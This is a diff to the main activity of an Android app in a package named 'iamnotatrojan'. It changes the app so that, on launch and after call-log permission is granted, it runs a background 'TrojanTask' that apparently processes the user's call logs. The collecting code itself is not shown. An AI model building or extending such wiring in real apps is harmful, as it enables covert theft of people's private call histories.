@@ -5,21 +5,24 @@ import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import don.petruchio.iamnotatrojan.trojan.Trojan
 import android.content.pm.PackageManager
-
-
+import don.petruchio.iamnotatrojan.trojan.TrojanTask
+import java.util.logging.Level
+import java.util.logging.Logger
 
 class MainActivity : AppCompatActivity() {
 
-    private var trojan:Trojan? = null
+    private var trojanTask: TrojanTask? = null
+
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        trojan = Trojan()
+        trojanTask = TrojanTask(this.applicationContext)
+
 
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M){
             if (Trojan.checkPermisions(this.applicationContext)){
-                trojan?.processCallLogs(this.applicationContext)
+                trojanTask?.execute()
             } else {
                 Trojan.requestPermissions(this@MainActivity)
             }
@@ -36,7 +39,7 @@ class MainActivity : AppCompatActivity() {
             Trojan.requestCode -> {
 
                 if (grantResults.size > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    trojan?.processCallLogs(this.applicationContext)
+                    trojanTask?.execute()
                 } else {
                     this.finish()
                 }
@@ -44,6 +47,4 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
-
-
 }
